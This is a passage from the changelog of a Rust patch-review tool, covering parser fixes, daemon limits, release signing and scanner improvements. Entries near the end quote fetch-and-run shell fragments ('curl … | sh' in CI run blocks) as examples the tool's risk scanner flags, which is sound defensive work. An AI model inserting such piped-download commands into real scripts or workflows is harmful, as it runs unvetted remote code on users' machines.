  patch DDF accepts, `git apply --numstat -z` must name the same files with the same added and
  deleted counts. It runs over every patch fixture and fuzz regression, and over every
  one-character edit of a hunk header placed in front of a hidden file. All six of its tests fail
  on v0.7.0's parser, each for the reason it names (control, measured).
- **The `patch_parser` fuzz target reads raw bytes** through the lossy decoder (it skipped non-UTF-8
  input), checks that no accepted hunk is change-free, and is seeded with every committed patch,
  regressions included.

- **Tests clean up after themselves** (DDF-TEST-TMPLEAK-001). About 100 test sites built
  `temp_dir()/ddf-<name>-<pid>` by hand, and many never removed it: one full `cargo test
  --workspace` left 51 files and directories in the temp dir (measured). Every test now takes a
  `deep_diff_forge_testkit::Scratch`, a fresh 0700 directory that is removed when it drops, pass
  or panic. The new crate `deep-diff-forge-testkit` is test-only and never published (path-only
  dev-dependency; `deny.toml` `allow-wildcard-paths`). `clippy.toml` disallows
  `std::env::temp_dir`, and `only_the_testkit_names_the_temp_dir` scans every Rust file for it,
  since integration tests opt out of `disallowed_methods` file by file.

### Fixed

- **A daemon at its connection limit is no longer reported absent on macOS.** The daemon accepts
  and closes a connection over its limit; macOS can report that as `ENOTCONN` from the client's
  peer-credential check, which the CLI read as "no daemon at" (exit 6, wrong message) instead
  of "no answer … (it may be at its connection limit; retry)". Seen on PR #100's macOS run.

- **Two daemon tests no longer race the server on macOS** (DDF-TEST-MACTIMEOUT-001, #97).
  `a_connection_answers_and_ends_within_a_deadline` and `a_control_connection_answers_one_small_request`
  armed the client's read timeout after the connection thread could answer and close, and macOS
  refuses `SO_RCVTIMEO` on a socket whose peer has closed (`EINVAL`). It failed attempt 1 of the
  v0.7.0 release run. Both now arm it before the thread starts. A test race; the product already
  treats that `EINVAL` as settled.
- **Three daemon paging tests are bounded** (DDF-TEST-PAGEBOUND-001). `outline_pages_cover_every_hunk_once`,
  `outline_cursors_at_a_file_without_hunks_resume` and `pages_of_escaped_text_fit_their_budget_as_emitted`
  paged until `next_cursor` was null, so a pager that never ends spun the test instead of failing it
  (a mutation run left two such binaries spinning). Each now takes at most 10,000 pages and then
  asserts paging ended. Control: with `next_cursor` falling back to the request cursor, the old
  tests ran to the 120 s mutation timeout; the new ones fail in 40 s.

## [0.7.0] - 2026-11-03

PRs #95 and #96 merged before the tag, so their entries below ship in v0.7.0 (`3823fcf`).

### Security

- **Release archives are reproducible** (expert circle 2026-11-03, C14). `scripts/package_release.py`
  replaces `tar czf`: sorted entries, the commit time as every mtime, uid/gid 0, fixed modes, USTAR,
  and a gzip header with no name or time. The same inputs give the same bytes; a control test
  shows `tar czf` does not. The macOS runner image was pinned to `macos-26` before the tag (see Changed).
- **The release workflow refuses a tag that is not signed by an allowed key** (expert circle
  2026-11-03, C4). The supply-chain gate verifies the pushed tag against `main`'s
  `.github/allowed_signers` before any build, so a tag pushed without `just release-tag`, or
  from a commit that lists its own key, publishes nothing. A dry run checks the newest `v*` tag.
- **SBOM checksums identify the package source** (C6). Each registry package now carries the
  SHA-256 of its `.crate` archive, as recorded in `Cargo.lock`, not a hash of its `Cargo.toml`.
  Workspace members carry none.
- **Release tags are signed.** `just release-tag` now signs the tag with SSH through
  `scripts/sign_release_tag.sh` and deletes it, before pushing, unless it verifies against
  the new `.github/allowed_signers`. v0.6.0 is the first signed tag. Tests run the script
  with a trusted key, an untrusted key and no signers file.

### Changed

- **The macOS runners are pinned to `macos-26`** (it was `macos-latest`, which named
  `macos-26-arm64` on 2026-11-03). A test in `release_workflow.rs` fails if any workflow
  uses a `-latest` runner label, so a GitHub repoint can no longer move a build or the
  required `macOS tests` check to a new major image unannounced. The job names, and so the
  required checks, are unchanged.
- **"Not a regular file" exits 4 in every command** (expert circle C16). `structural`,
  `semantic` and the other syntax commands, `analyze`, and `--findings` exited 3 for a FIFO,
  directory, device or socket. `<old> <new>` and `eval` already exited 4. A path that cannot be
  read at all (missing, no permission) still exits 3.
- **The same input can now report `renamed` where it reported `modified`** (DDF-HUNT-PATCH-6).
  This affects a Git section whose `---`/`+++` names differ, with no rename header: two-file
  review (`deep-diff-forge <old> <new>`), and `--stdin-patch`, `diff.compute` or MCP input of that
  shape. A consumer filtering on `status == "modified"` for such input now sees `renamed`. The
  status names did not change, so the schemas stay `v0`. The `v0` compatibility rule is now
  written down in `docs/API_AND_IPC.md` (Protocol Versioning).
- **New `old_path` member** in `review.v0` files and `diff.file` JSONL events, for a `renamed` or
  `copied` file, plus `(from <old>)` in the text summary. The hazards of the old path count in
  `hazards`, so renaming `.github/workflows/x` away is flagged.

### Fixed

- **`just release-tag` no longer fails its own gate under a signing configuration.** The
  repository-script tests kept out the global and system Git files but inherited
  configuration passed in the environment (`GIT_CONFIG_COUNT`, and `GIT_CONFIG_PARAMETERS`
  from `git -c`). With `tag.gpgSign=true` there, as `release-tag` is run, a lightweight test
  tag became an annotated one that asked for an editor, and the release gate failed before
  signing (found on the first `release-tag 0.7.0`; no tag was made). The tests' command
  runner now removes both unless a test sets its own. Measured: the workspace suite passes
  under the exact release-tag environment, and the old runner failed it.
- **A client whose request the daemon refuses early still gets the refusal.** Under the new read
  budget the daemon answers an over-budget line and closes before the rest is sent, which broke the
  client's write. `request` reported the broken pipe instead of the answer waiting for it. It now
  reads the answer first (found by the release dry run on Linux arm64).
- **The daemon caps the request bytes it reads across connections** (expert circle C3). Each data
  connection reserves its line's bytes, as they arrive, against one 160 MiB budget
  (`MAX_READ_BYTES`), and holds them until its answer is written. Before, each of the eight
  connections could buffer an 80 MiB line, and its parsed copy, outside the in-flight budget:
  about 1.25 GiB at worst. A line over the budget is answered `RESOURCE_EXHAUSTED` and its
  connection closed. Control connections are not counted.
- **Daemon work stops at its client's read deadline** (C9). A socket request runs under its
  client's 30 s deadline. It is checked before the work starts and after each heavy stage (the
  parse, a Git acquisition, a session snapshot); past it, the request ends `RESOURCE_EXHAUSTED`
  and releases its worker and admission weight. Before, the work went on for an answer nobody
  would read. The stdio `rpc` and MCP servers have no such deadline.

- **A move header with no partner is refused, as Git refuses it** (expert circle 2026-11-03).
  `copy from x`, `copy to y`, `rename from x` or `rename to y` alone, with no `---`/`+++` to name
  the other side, was reviewed as a copy or rename. `git apply` refuses each ("git diff header
  lacks filename information"). Where `---`/`+++` does name the other side, DDF now records it as
  the header Git reads. Before, `rename to y` beside `--- a/x` rendered as a move from `y`.
- **A mode that Git reads as unchanged is no mode change** (expert circle 2026-11-03). Git
  canonicalises modes (`canon_mode`): only the owner's execute bit counts for a regular file. So
  `100644 -> 100664`, and a lone `old mode` or `new mode`, change nothing. A section whose only
  content is such a header is refused, as `git apply` refuses it ("patch with only garbage");
  it was reviewed as a mode or type change.
- **A fatal accept error no longer strands the daemon's socket** (expert circle C8, 2026-11-03).
  A persistent accept failure, such as EMFILE when the process runs out of descriptors, returned
  at once. That skipped the socket cleanup and cut off the answers in progress. It now ends the
  loop as a shutdown does: the socket is removed, the answers drain, and then the error is
  returned. A setup failure after binding (the signal watcher) removes the socket too. A client
  that gave up while queued (ECONNABORTED) no longer stops the daemon.
- **`eval` holds the corpus to byte limits** (expert circle C5). The manifest and each case
  file are limited to 8 MiB, and the case files together to 64 MiB. Each limit is checked
  before a file is read whole, and going over it is exit 4. Before, `read_to_end` had no limit.
- **The soak receipt records the daemon's counters** (expert circle C10). `daemon metrics` is
  read at the start and at the end of the weekly soak and kept in the receipt's `metrics`, so the
  history that OPERATIONS_AND_DAEMON points to exists. The soak fails when the final read fails.
- **A Git section naming two different files is reviewed as the rename `git apply` makes**
  (DDF-HUNT-PATCH-6). `diff --git a/x b/y` with `--- a/x`/`+++ b/y` and no rename header was
  reviewed as `modified y`, but `git apply` deletes `x` and creates `y`. The review now says
  `renamed` and keeps `x` as the old path. Two-file review (`deep-diff-forge <old> <new>`, which
  reads `git diff --no-index` output) therefore reports `renamed`. A Git oracle test applies the
  original and the rendered patch and compares the trees.
- **A doubled slash in a `diff --git` name no longer breaks render stability** (DDF-FUZZ-PATCH-8,
  found by the scheduled fuzz campaign of 2026-11-02 on the v0.6.0 commit). A quoted half lost a
  `/` that an unquoted half kept. The crash input is kept in `fixtures/patch/regressions/`.
- **A FIFO given as an input file no longer hangs the CLI** (DDF-HUNT-CLI-8). `findings verify
  --findings FIFO` and `review --findings FIFO` waited for ever for a writer, and so did `eval`
  when the corpus's `MANIFEST.json` was a FIFO, because it is read before the corpus walk checks
  file types. Every user-named input file is now opened through one helper (`regular.rs`): it
  opens with `O_NONBLOCK`, checks the type of the open descriptor, and refuses anything but a
  regular file (exit 3; exit 4 for the eval corpus). The syntax commands and analysis already did
  this, and now share the helper. Tests run each command against a FIFO under a 10-second
  deadline; on the old code they time out.
- **The daemon can be stopped and checked at its connection limit** (DDF-HUNT-DAEMON-7). Two
  control slots beyond the eight data slots answer `daemon.health`, `daemon.status`,
  `daemon.metrics` and `daemon.shutdown`. Each holds one small request, read within 5 s. Before,
  eight idle clients kept `daemon stop` out and only a signal stopped the daemon.
- **On macOS, a daemon at its connection limit is no longer reported as absent.** macOS refuses to
  set a write timeout on a connection the daemon has already closed, and the CLI read that
  `EINVAL` as "no daemon at". It now reports "no answer", with exit 6 (found by macOS CI on this
  change).
- **SIGTERM and SIGINT stop the daemon cleanly**: they now drain the answers in progress, remove
  the socket and exit 0, as `daemon stop` does. That covers `launchctl bootout`, `systemctl stop`,
  `kill` and Ctrl-C. Before, the signal killed the daemon and left its socket file behind.

## [0.6.0] - 2026-11-02

### Dependencies

- **Dependabot's first version updates, applied together** (#63 to #70): serde 1.0.229,
  serde_json 1.0.154, rustix 1.1.5, unicode-width 0.2.2, tree-sitter 0.26.13,
  `actions/attest-build-provenance` and `github/codeql-action` 4.39.1 (SHA-pinned). The
  individual pull requests each failed the SBOM gate (a dependency bump moves the committed
  SBOM) and the workspace bumps also left `fuzz/Cargo.lock` stale; this change regenerates both,
  with the fuzz lock moved only as far as the bumps require (its `syn` follows the workspace's
  3.0.4). tree-sitter 0.26 changed the parse progress callback to return `ControlFlow`: the
  deadline cancel now returns `Break` where it returned `true`.
- **Dependabot groups each ecosystem's updates into one pull request** (`cargo`, `fuzz`,
  `actions`), so the SBOM and fuzz lock are regenerated once per group.

### Added

- **An exact platform matrix.** The supported platforms are four release targets, listed in
  README.md#supported-platforms, SECURITY.md and RELEASE_AND_PUBLICATION.md, and
  `cli/tests/crate_edges.rs` fails when the release matrix or those docs name another set of
  target triples, when a doc omits the glibc floor, or when a doc mentions musl without stating
  it as unsupported:
  - **`aarch64-unknown-linux-gnu` is a release target**, built and run natively on GitHub's
    `ubuntu-22.04-arm` runner like the others (smoke, checksum, provenance). Not
    `ubuntu-24.04-arm`: built there, the binary had a hard need of `GLIBC_2.39`, over the floor
    (measured by the first CI run of the floor check). A `Linux arm64
    tests` job runs the whole suite there on every event: not a required check on pull requests,
    but it gates every release build through release.yml's `quality`, as `macOS tests` does.
    Both passed on their first pull-request run (#79, 2026-11-01) and on every pull request
    since.
  - **A declared and enforced glibc floor: 2.34.** `scripts/check_glibc_floor.sh` fails the
    release smoke when a Linux binary needs a newer `GLIBC_` symbol version; a Linux-only test in
    `crate_edges.rs` runs it on the built binary (passes) and with a lowered floor (refused). Measured: the
    v0.5.0 x86_64 binary needs at most `GLIBC_2.34`, ran on glibc 2.34, 2.35 and 2.36, and was
    refused by the loader on 2.31. On glibc 2.34 to 2.38 the loader prints one stderr warning
    per run (``weak version `GLIBC_2.39' not found``, from optional symbols in Rust's standard
    library); output and exit codes are unchanged.
  - **musl is stated as unsupported** (not built or tested), as are Windows, other
    architectures and the BSDs. The macOS minimums (11.0 arm64, 10.12 x86_64) are the ones the
    binaries declare, not run.
- **The launchd agent is loaded by a real launchd in CI.** The `macOS launchd agent` job runs
  `scripts/launchd_smoke.sh`: the plist, pointed at the built binary, is bootstrapped into
  `gui/<uid>` (or `user/<uid>`), answers `daemon health` with launchd's pid, is restarted after
  SIGKILL, stays stopped after `daemon stop` with its socket gone, and is unloaded by `launchctl
  bootout`; every wait is bounded. Not a required check, and skipped in release runs (release.yml
  calls ci.yml with the new `release: true` input) so its unproven timed waits cannot block a
  release build; its first run on a hosted Mac is pending CI (the flow was checked only against a
  fake `launchctl` on Linux).
- **Daemon metrics for Prometheus, without a listener.** `daemon metrics --format prometheus`
  prints the `daemon.metrics` answer in the Prometheus text format 0.0.4 (`ddf_daemon_*` names,
  `_total` counters, seconds and bytes in the names, escaped labels, a latency histogram with
  cumulative `le` buckets and no `_sum`, which the daemon does not keep), and `--out PATH` writes
  it whole for node_exporter's textfile collector: a temporary file in the same directory, then a
  rename; a symlink or non-regular file at PATH is refused (exit 3); mode `0644`, also under
  umask 077. A temporary left by a killed run is skipped (the next of 8 names), not reused. A daemon with no
  usable metrics exits 6 and leaves the file as it was. The JSON answer (`--format json`, the
  default) and the RPC are unchanged; both renderings read the same document
  (`deep_diff_forge_daemon::exposition`), and a strict reader in its tests checks the format's
  rules. `contrib/systemd/deep-diff-forge-metrics.{service,timer}` write it every 15 s. Not run
  against a real node_exporter or promtool (neither is installed here).
- **`deep-diff-forge [--] <old> <new>` reviews two regular files.** `patch::diff_files` runs
  `git diff --no-index` with the acquisition's hardening, from `/` on the canonical paths, with
  `core.attributesFile=/dev/null`, `GIT_ATTR_NOSYSTEM=1` and `core.autocrlf=false`; the CLI seals
  Git's exact bytes and prints every `--stdin-patch` mode (`--json`, `--jsonl`, `--rank`,
  `--cluster`, `--outline`, `--hunks`, `--layout`, the input guards). Refused, by name: a
  missing path (exit 3), a path that is itself a symbolic link, a directory or special file
  (exit 4; a linked parent directory resolves), two sizes over the 64 MiB budget, checked before
  Git reads them (exit 4). Git's answer must be one of its two shapes for a readable pair (exit 0
  with no patch, exit 1 with one) with nothing on stderr; otherwise exit 3. Without that check a
  side removed after DDF's checks (Git: exit 1, empty stdout, `Could not access`) was reviewed as
  "0 files changed" with exit 0 (review finding, reproduced with real Git and a stub). A first word that is neither a command
  nor a file stays `unknown command` (exit 2); `--` marks it as a path. Directories are out of
  scope. Measured while building it: run inside a repository, `git diff --no-index` ran that
  repository's own clean filter, and the user's `core.autocrlf` changed the compared bytes;
  `cli/tests/file_pair.rs` fails if either comes back. New errors `GitAcquireError::FileUnreadable`
  and `FileRefused` (a breaking change for an exhaustive `match` on `GitAcquireError`); the
  exit-4 registry meaning now names a refused file pair.

### Changed

- **`chain`, `cluster` and `loom` are withdrawn, not planned.** `--help` listed them, with
  `<old> <new>`, as "NOT YET IMPLEMENTED" and nobody owned them. Each is now refused with exit 2
  and its replacement, even with a second word that would otherwise be a path pair, and
  `--help` lists them under "WITHDRAWN". `chain-contract` and `cluster-contract` list only
  shipped modes (a test runs each one); `cluster-contract` names the two dimensions that run
  (patch, risk) and no longer claims per-lane budgets; `loom-contract` records the withdrawal.

- **Dependabot watches the Python client.** `.github/dependabot.yml` gains a weekly `pip` entry
  for `sdk/python` (its only requirement is the setuptools build backend), with the same 7-day
  cooldown as the Cargo and Actions entries.
- **Whole-crate mutation of `core`, `patch`, `daemon` and `syntax`** (EVIDENCE.md, 2026-11-01).
  51 tests pin the mutants each crate's own tests missed: hunk addresses and digests, Git
  C-quoted paths, the raw-record and patch-block identity checks, the exact `review.v0`
  document, rename and truncation refusals in the parser, a socket line that ends at its
  newline, and the byte, node and cell budgets of the syntax crate at exactly their limit.
  Missed by the crate's own tests: `core` 22 to 3, `patch` 82 to 3, `syntax` 29 to 3, each
  remaining one equivalent or compiled only off Unix. `daemon` (16 missed, 13 timeouts) was
  re-run in workspace scope only, not whole: the workspace's tests catch all but 3 equivalents
  (2 of them caught only by `graph`'s timing test on a loaded machine) and one loop mutant that
  still times out. Tests of edit-script loops, tree walks and
  quoted-path decoding run under a 10 s deadline, so a loop that stops advancing fails its test
  instead of hanging the suite. Test code only.

- **The Python client is a package.** `sdk/python/pyproject.toml` (setuptools, no dependencies,
  Python 3.9+) installs `deep_diff_forge` as the package `deep-diff-forge`, from a checkout
  (`python3 -m pip install ./sdk/python`) or from GitHub with `#subdirectory=sdk/python`. It is
  not on PyPI. `deep_diff_forge.__version__` exists, and `cli/tests/python_sdk.rs` keeps both
  version strings equal to the workspace version.
- **The daemon drains on stop.** After `daemon.shutdown` the socket is removed and the listener
  closed (queued connections are refused at once), and the requests in progress, counted from
  their first byte until their response is flushed, are answered before the process exits, for
  up to 30 s. Idle connections are not waited for. A request read
  after the stop is refused with `RESOURCE_EXHAUSTED` (8), "the daemon is shutting down".
  Before, the process exited as soon as the accept loop returned, cutting off answers in
  progress. The log records `shutdown_drained` (level `info`) or `shutdown_drain_timeout`
  (`warn`).
- **`daemon stop` returns once the daemon has exited**, waiting up to 35 s for its start lock
  (`SocketLocation::stop_waiter`, opened before the stop so a symlinked socket path finds the
  real lock; `STOP_WAIT`), and exits 6 if it has not. Before, it returned
  while the daemon was still exiting, so a `daemon start` right after it could find the old
  daemon in the way.
- **Service units:** `contrib/systemd/deep-diff-forge.service` (systemd user unit) and
  `contrib/launchd/dev.deep-diff-forge.daemon.plist` (launchd agent, which sets
  `XDG_RUNTIME_DIR`, absent on macOS). `cli/tests/service_units.rs` keeps them consistent with the
  CLI. The systemd `ExecStop` ignores "no daemon" (`-`): systemd also runs it after a daemon
  stopped from a shell, and its exit 6 restarted the unit (measured: `NRestarts=1` without the
  `-`, 0 with it).
- **The live review loop is tested.** `deep-diff-forge-tui`'s `run` takes the terminal through one
  seam: stdout and crossterm's raw-mode, `read` and `poll` functions, passed in as values, so
  production has no adapter code of its own. Tests drive that same loop and restore with scripted
  input against a `TestBackend`: the frame drawn is the headless render, a queued burst is
  applied before one redraw, nothing queued after `q` is read, a resize redraws at the new size,
  and an ending or failing input, a failing draw, a panic or a failed restore each return their
  error (or unwind) with raw mode off and the alternate screen left. `cli/tests/review_tty.rs`
  runs bare `review` in a pseudo-terminal (Python's `pty`): the alternate screen and mouse
  capture are entered, the cockpit is drawn, `q` exits 0, and both are restored.


- **The evaluation corpus has 34 cases, and declared misses count.** `fixtures/eval` grew from
  11 to 34 cases (14 ranking, 17 evidence, 3 findings), each with a classified origin: a CVE,
  GHSA or RUSTSEC shape (CVE-2021-42574, CVE-2023-49291, CVE-2024-32002, GHSA-pjwm-rvh2-c87w,
  RUSTSEC-2022-0042), a real-world shape, one of this project's findings, or `synthetic:` with
  its reason. Three are hard negatives, where a risky-looking file must not outrank.
  - A declared miss now counts as wrong in its metric; before, the one known miss was left out
    of recall. A ranking pair can be declared (`known_miss`), and so can an evidence false
    positive (`known_false_positive`). The receipt lists them in a new `declared` field, and the
    summary prints each as `KNOWN …` under a `declared` count (it printed `known misses`).
    `known_misses` keeps its meaning, the evidence `known_miss` items (7); `declared` lists
    every kind (11). A declared miss the engine gets right fails the run.
  - The engine was not changed. It gets 11 cases' labels wrong, all declared: ranking 12/15,
    evidence precision 21/22, recall 21/28, findings 33/33 (measured). `cli/tests/eval.rs`
    holds those values as its floors, which were 100% over a smaller corpus.
  - The manifest is refused (exit 4) when a file of the corpus is named by no case, or a case
    has no origin, the id of another case, or a field its kind does not read, when a ranking
    pair is not exactly two distinct paths (`[p, p]` can never hold, so as a `known_miss` it
    could never go stale; before, it was a wrong label, exit 7), and when the corpus holds a
    symlink (it could lead out of the corpus). A case can name only a file of the corpus
    directory (exit 3 otherwise).

### Fixed

- **The arm64 Linux release build smokes its binary** (2026-11-02). The smoke step read the
  workspace version with Python's `tomllib`, which the `ubuntu-22.04-arm` runner's Python 3.10
  lacks, so the first release dry run with the arm64 target (run 41386917463 on `aac52a6`) failed
  before the smoke ran; the other three targets passed. `ci.yml` had the same defect, fixed in
  #82 (DDF-CI-ARM-001), but `release.yml` kept it. The step now reads the version as
  `just release-tag` does (`sed`), and `cli/tests/release_workflow.rs` refuses a matrix job that
  imports `tomllib` without `actions/setup-python`.
- **`pip install ./sdk/python` installs the current client** (2026-11-02). The repository
  tracked setuptools output (`sdk/python/build/lib/deep_diff_forge.py` and
  `deep_diff_forge.egg-info/`). setuptools reuses an existing `build/lib`, so an install from a
  checkout of `main` installed that copy: the client from before the bug-hunt fixes (no write
  timeout, weaker response validation), measured in a clean venv. The output is untracked and
  ignored (`/sdk/python/build/`, `/sdk/python/dist/`, `*.egg-info/`), and
  `cli/tests/python_sdk.rs` fails if `.gitignore` stops ignoring it. The `pyproject.toml` install
  comment names `@v0.6.0`, the first tag with package metadata. Found by the independent
  rescore of 2026-11-02.
- **A failed alternate-screen entry no longer leaves the terminal in raw mode.** `review` switched
  raw mode on, then wrote the alternate-screen sequence, and armed its restore guard only after
  that write; if the write failed (stdout closed) it returned with the terminal still raw. The
  guard is now armed as soon as raw mode is on. If raw mode cannot be switched on, nothing is
  written.
- **`review` on macOS reads keys through a reader that can wait on `/dev/tty`.** The patch is
  on stdin, so crossterm reads keys from `/dev/tty`, and its default reader registers that fd
  with kqueue, which refuses it on macOS (crossterm-rs/crossterm#500): `review` would fail on
  its first key read there. The tui crate enables crossterm's `use-dev-tty` feature on macOS
  only (select(2) through `filedescriptor`; adds `filedescriptor` 0.8.3 and `thiserror` 1 to
  the macOS build). Inferred from source, not observed on a Mac: the `macOS tests` job runs
  `cli/tests/review_tty.rs`, which is the check.

- **A `review.hunks` selection that repeats a name can no longer abort the daemon.** Each repeat
  of a path in `paths` pushed every hunk of that file again, so 50,000 repeats of one path over
  4,000 hunks (a 619 KB request) asked for 3.2 GB; under a 2 GB address-space limit the
  allocation failed and the daemon aborted (`SIGABRT`, which `catch_unwind` cannot contain),
  losing every session and leaving its socket and lock behind. Repeated `addresses` duplicated
  the same way. A repeated name now selects its hunks once, keeping the order of first mention,
  so a selection never holds more hunks than the review has; the answer to `["x.rs","x.rs"]` is
  the answer to `["x.rs"]` (`views.rs` `select`). Also reached through `review.change`
  `view=hunks` and the MCP `review_hunks` tool.
- **`review.hunks` by address hashes each hunk once per request.** Every requested address
  recomputed every hunk's address (a SHA-256 of the hunk), so the cost grew with addresses times
  hunks: 4,000 addresses over 4,000 hunks (a 490 KB request) held a worker for 18 s, measured on
  the release build, while admission weighed it by its line length. The selection now builds one
  address table per call, as `findings.verify` has since DDF-PERF-001, and looks each address up
  in it; paths are looked up through a path table the same way.
- **Error answers are held to the 80 MiB line cap.** Only a success was bounded, and an error
  repeats request text: one unknown path of 27 million U+202E characters (an 81 MB request) drew
  a 243 MB error line, because `display_safe` writes each 3-byte character as the 8-byte
  `\u{202e}`, and a client using the daemon's own `request` helper got "daemon response exceeds
  maximum size" instead of the `INVALID_PARAMS` meant. The cap was also measured before
  `json_line_safe`, which writes each line separator in 6 bytes rather than 3, so an id of
  U+2028 characters came back at twice its size. Now an error message is cut at 4 KiB
  (`MAX_ERROR_MESSAGE_BYTES`, at a character boundary, with the count of bytes left out), an
  unknown address or path is repeated within 1 KiB and an unknown param name or session id
  within 256 bytes (`display_safe_bounded`), and every answer `process_line` returns is measured
  as written; one over the cap becomes `RESOURCE_EXHAUSTED` (8), without the id when the id alone
  would put it over.
- **MCP tool errors are held to the same 4 KiB message bound as the socket.** The cut was only
  in the socket's `error_response`, and the MCP server reads a daemon error's message directly,
  so `review_change` with a repo of 100,000 U+202E characters (a 600 KB request) answered with a
  901 KB tool error (measured, release build); `review.change` repeated each request-named path
  or value whole, three times its size for bidi characters, and the MCP server repeated an
  unknown tool, argument or method name whole. Now `RpcError::new` cuts the message where it is
  built, `review.change` repeats a request-named path or value within 1 KiB, the MCP server
  repeats a tool, argument or method name within 1 KiB, and every MCP tool and protocol error is
  cut to `MAX_ERROR_MESSAGE_BYTES`; the same request now answers in 1.3 KB.
- **`review.hunks` by address holds memory for the requested addresses, not for every hunk.**
  The address table kept every hunk's 64-character address, whatever was asked, so one address
  over 300,000 one-line hunks peaked at 195 MB against 130 MB for a path selection (measured,
  release build), memory that admission does not weigh. The table now keeps only the requested
  addresses a hunk has, each hunk's address still computed once; the same request peaks at
  130 MB.
- **`daemon health` and `daemon stop` no longer say there is no daemon when it is at its
  connection limit.** A daemon serving eight connections closes a ninth at once, unanswered (by
  design), and the client's reset or broken pipe was reported as `no daemon at PATH`: eight idle
  connections made the CLI report a running daemon absent for 30 s, and eight that each send a
  request within 30 s kept it so indefinitely (measured). A reset, broken pipe, early end of file
  or read timeout now reads `no answer from the daemon at PATH (it may be at its connection limit;
  retry)`, still exit 6; `no daemon at` is kept for a missing or refused socket.
- **Refused request lines are counted in `daemon.metrics`.** A line that is not UTF-8, one over
  the 80 MiB cap and one sent during a stop were answered by the connection itself and never
  counted, so `ddf_daemon_requests_total{method="(unknown)"}` and its `parse_error`,
  `invalid_request` and `resource_exhausted` errors under-reported them (three of four parse
  errors were missing in a measured run). They are now counted under `(unknown)`, on the socket
  and in `deep-diff-forge rpc` (`serve::refusal`).
- **The daemon's memory guidance describes parallel requests.** `docs/OPERATIONS_AND_DAEMON.md`
  still said the daemon "runs one request at a time", from before 0.4.0; it now sizes the peak
  for the requests admission lets run together (two at the 64 MiB budget) and for the waiting
  lines, which are parsed before admission and not counted in its budget.
- **`envelope` wraps the wrapped command's `--help`.** `envelope -- --stdin-patch --help` and
  `envelope -- council --help` printed envelope's own help as plain text with exit 0, ran
  nothing and printed no `ddf.result.v1` object, because the help scan read every word, including
  those after `--`. The scan (`args::help_requested`) now stops at `--` and skips an option's
  value, so `--hunks --path -h` selects the file named `-h` and `review --findings -h` reads it,
  where both printed help. `review` takes the word `help` only first (`review help`): a later
  `help`, as in `review --side help`, printed the help with exit 0 and is now refused as an
  unexpected argument (exit 2). `council` keeps its own scan, so `council … --session -h` still
  prints the council help.
- **A second output mode is refused, not dropped.** `--jsonl --rank` printed only JSONL,
  `--json --layout inline` only JSON, `--cluster --layout inline` only the cluster,
  `--acquisition-json --rank` only the acquisition, and `--jsonl --hunks --path nothing` skipped
  the path check, each with exit 0. `--jsonl`, `--layout`, `--acquisition-json` and a `--json`
  that is not the format of `--rank`, `--cluster`, `--outline` or `--hunks` now join the one-mode
  check (exit 2, before input is read), and `--address` with `--path` is refused there too: it
  was checked only after the patch was read, so a patch that failed to parse exited 4 instead.
- **A single-valued option given twice is refused.** The first value was used and a later one
  was never read or validated: `--parallel 4 --parallel bogus` ran with 4, `--max-bytes 1000000
  --max-bytes 2048` printed a page 34 times the appended budget, and `--repo . --repo /nonexistent`
  reviewed `.`, all with exit 0. `args::admit` now exits 2 (`--parallel given more than once`);
  `--address`, `--path`, `--allow-repo` and `--workload` stay repeatable.
- **`chain-contract` states the shipped pipe and stdin behaviour.** It promised that pipe
  failures exit non-zero, but a closed stdout (`| head`) deliberately exits 0, and that stdin is
  read only with an explicit flag, but `findings verify` and `review` read the patch there
  without one. It now says a closed pipe exits 0, any other write failure exits 3, and names
  every command that reads stdin; `docs/CHAINING_AND_CLUSTERING.md` says the same.
- **A failed write of output without a final newline exits 3.** Stdout is line-buffered, so a
  tail after the last newline was written at exit, where the error is dropped:
  `highlight` of a file with no final newline into `/dev/full` exited 0 with the output lost.
  `emit` and `envelope` now flush and report the failure (exit 3; a closed pipe stays exit 0).
- **MCP `review_patch` with `paths` summarises the files it returns.** The `summary` kept the
  whole patch's totals, so a `review.v0` holding one file said `files_changed: 2`, and in
  `review-summary.v0` too; `selected` echoed a repeated path. The summary is now counted over
  the kept files (the seal stays the whole patch's) and `selected` lists each path once.
- **`envelope` exits 128 + N when signal N ends the wrapped command.** It exited 1, which the
  exit-code registry does not list, so `explain` could not describe it. 128 + N is the status a
  shell reports for the same command (`exit::SIGNAL_BASE`, not a registry code); the envelope
  still says `outcome: signal` and the signal number.
- **Go raw strings no longer hide the code after them from evidence.** The lexical scanner did
  not know Go's backtick strings and read their text as code, so a `/*` in a glob
  (`` filepath.Glob(`/tmp/build/*.o`) ``) opened a block comment that blanked every later line
  of the hunk, a `//` in a URL ended the line and a `"` opened a phantom string: the
  `exec.Command` and `http.Get` after them gave no `process_spawn` or `network_fetch`. A
  backtick now opens a Go string that runs no escapes and is followed across lines.
- **A `#` inside a quoted YAML scalar or a quoted shell word is no longer a comment.** Any
  word-start `#` ended a YAML line, so `echo "step #1" && curl … | sh` in a `run: |` block,
  `run: "echo ' #'; curl …"` and a flow mapping with a `"x #"` key before
  `pull_request_target` lost their `network_fetch` and `ci_privilege` evidence. YAML quotes are
  now tracked (a `''` or, in double quotes, a backslash escape; not after a word byte, so
  `it's` is text), and their contents are still kept as code.
- **The line that closes a multi-line string keeps its evidence.** Each line began as plain
  code, so the quote that closes a multi-line string (Rust, a shell string, a JS template, a
  Python string continued with `\`) opened a phantom string, and the `unsafe`, `curl`, `eval`
  or `os.system` after it was blanked. A string still open at the end of a line is now carried
  to the next line of the hunk, which is read both as code and as resuming inside the string;
  both readings go on down the hunk, and a byte any reading keeps is code.
- **A quote misread as an opener no longer hides the rest of the hunk.** An unreleased
  version of the fix above carried only the reading that resumed the string, so an apostrophe
  in text (`It's`, in a Go hunk that opens inside a raw help string) stayed open from line to
  line until a real quote "closed" it, and a `/*` in the string after it (a glob) opened a
  block comment that blanked every later line: the `http.Get` and `exec.Command` below gave no
  evidence. The same held in JS, Rust and Python. The plain reading, which resumes no string,
  now always goes on as well (with at most three others), so a line keeps at least what a scan
  without carried strings keeps.
- **Rust raw C strings are raw.** `cr"C:\"` and `cr#"…"#` were read as ordinary strings, whose
  `\"` escapes the closing quote, so the `unsafe` after one on the same line was blanked. The
  raw-string prefix check now accepts one `b` or `c` before the `r`.
- **A change to a whitespace-only string literal is no longer called formatting only.** The
  structural diff dropped every whitespace-only leaf as layout, but tree-sitter has no layout
  leaves: the leaves dropped were string contents, so `""` to `" "`, or a tab to two spaces,
  gave `reformat_only: true` in `structural` and in `analyze`'s coverage. A raw string's
  delimiters are no leaf either, so `f(a)` to `f(r"a")` changed no token. A string literal is
  now one token of its exact text, as a comment is; a token change inside a literal is reported
  as the whole literal removed and added.
